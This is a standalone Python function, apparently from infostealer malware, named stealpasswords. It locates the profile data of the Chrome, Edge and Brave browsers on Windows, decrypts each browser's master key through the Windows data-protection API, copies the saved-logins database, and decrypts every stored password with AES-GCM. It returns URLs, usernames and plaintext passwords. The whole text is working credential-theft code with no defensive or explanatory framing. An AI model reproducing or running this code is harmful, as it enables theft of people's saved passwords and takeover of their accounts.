def stealpasswords():
    passwords = []
    
    browsers = [
        ("Chrome", os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')),
        ("Edge", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')),
        ("Brave", os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'))
    ]
    
    for browser_name, data_path in browsers:
        try:
            local_state = os.path.join(data_path, 'Local State')
            if not os.path.exists(local_state):
                continue
                
            with open(local_state, 'r', encoding='utf-8') as f:
                local_data = json.load(f)
            
            key = base64.b64decode(local_data['os_crypt']['encrypted_key'])
            key = key[5:]
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
            login_db = os.path.join(data_path, 'Default', 'Login Data')
            if not os.path.exists(login_db):
                continue
            
            temp_db = os.path.join(tempfile.gettempdir(), 'temp_login.db')
            shutil.copy2(login_db, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, username, encrypted_password in cursor.fetchall():
                try:
                    if encrypted_password[:3] == b'v10':
                        iv = encrypted_password[3:15]
                        payload = encrypted_password[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        password = cipher.decrypt(payload)[:-16].decode()
                    else:
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                    
                    if password:
                        passwords.append({
                            'browser': browser_name,
                            'url': url,
                            'username': username,
                            'password': password
                        })
                except:
                    continue
            
            conn.close()
            os.remove(temp_db)
                
        except:
            continue
    
    return passwords
